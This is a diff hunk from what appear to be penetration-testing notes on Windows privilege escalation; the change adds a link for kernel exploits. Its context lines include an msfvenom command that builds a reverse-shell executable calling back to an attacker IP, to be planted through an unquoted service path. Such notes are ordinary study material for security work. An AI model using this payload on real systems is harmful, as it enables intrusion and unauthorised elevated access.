@@ -2088,7 +2088,7 @@ If this setting is enabled, we could craft an MSI file and run it to elevate our
 	This payload was created because an unquoted service path C:\Program Files\Zen Service Desk\Zen... was found. zen.exe was created so that it will auto-run the .exe file upon reboot (in this example, the service auto starts, so a reboot of the system is all is required)
 	msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.185 LPORT=8888 -f exe -o zen.exe
 	```
-- Kernel Vulnerabilities
+- Kernel Vulnerabilities (https://github.com/SecWiki/windows-kernel-exploits)
 - Refer to PDF
 
 
